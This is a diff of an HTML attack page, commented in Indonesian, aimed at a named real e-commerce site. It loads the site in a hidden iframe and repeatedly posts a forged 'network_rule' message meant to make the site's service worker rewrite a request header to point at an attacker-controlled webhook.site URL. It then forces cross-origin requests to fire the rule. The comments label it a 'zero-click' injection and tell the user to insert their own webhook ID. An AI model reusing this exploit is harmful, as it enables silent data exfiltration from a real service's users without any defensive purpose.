@@ -1,45 +1,54 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head><title>System Loading...</title></head>
 <body>
-    <iframe id="secret_gate" src="https://shop-id.tokopedia.com/robots.txt" style="display:none;"></iframe>
+    <iframe id="target_frame" src="https://shop-id.tokopedia.com/" style="display:none;"></iframe>
 
     <script>
-        const gate = document.getElementById('secret_gate');
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
+        const frame = document.getElementById('target_frame');
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // Ganti ID Webhook lu
 
-        // Fungsi injeksi yang lu pake di console kemarin
-        function inject() {
-            console.log("Executing silent injection...");
-            gate.contentWindow.postMessage({
-                source: "main_thread",
-                eventName: "network_rule",
-                data: [{
-                    ruleName: "zero_click_pwn",
-                    global: true,
-                    conditions: [],
-                    handlers: [{
-                        handler: "replace",
-                        type: "header",
-                        field: "X-Pns-Referrer",
-                        value: webhook
-                    }]
+        const payload = {
+            source: "main_thread",
+            eventName: "network_rule",
+            data: [{
+                ruleName: "zero_click_final",
+                global: true,
+                conditions: [],
+                handlers: [{
+                    handler: "replace",
+                    type: "header",
+                    field: "X-Pns-Referrer",
+                    value: webhook
                 }]
-            }, "*");
+            }]
+        };
+
+        function attemptInjection() {
+            try {
+                // Mengirim pesan ke contentWindow Iframe
+                frame.contentWindow.postMessage(payload, "*");
+                console.log("Payload sent...");
+            } catch (e) {
+                console.log("Retrying...");
+            }
         }
 
-        gate.onload = function() {
-            // Tunggu 2 detik setelah iframe load, lalu injeksi
-            setTimeout(() => {
-                inject();
-                
-                // Trigger fetch otomatis agar rule langsung jalan ke webhook
-                const trigger = new Image();
-                trigger.src = "https://shop-id.tokopedia.com/robots.txt?nocache=" + Math.random();
-                
-                console.log("Injection sent and triggered!");
-            }, 2000);
-        };
+        // Jalankan injeksi berkali-kali untuk memastikan SW menangkapnya
+        const interval = setInterval(attemptInjection, 500);
+
+        // Berhenti setelah 10 detik dan paksa pemicuan fetch
+        setTimeout(() => {
+            clearInterval(interval);
+            console.log("Triggering fetch event...");
+            
+            // Cara paling ampuh trigger SW fetch tanpa klik: Image tag cross-origin
+            const img = new Image();
+            img.src = "https://shop-id.tokopedia.com/favicon.ico?cache=" + Math.random();
+            
+            // Atau fetch via script
+            fetch("https://shop-id.tokopedia.com/robots.txt", { mode: 'no-cors' });
+        }, 10000);
     </script>
 </body>
 </html>
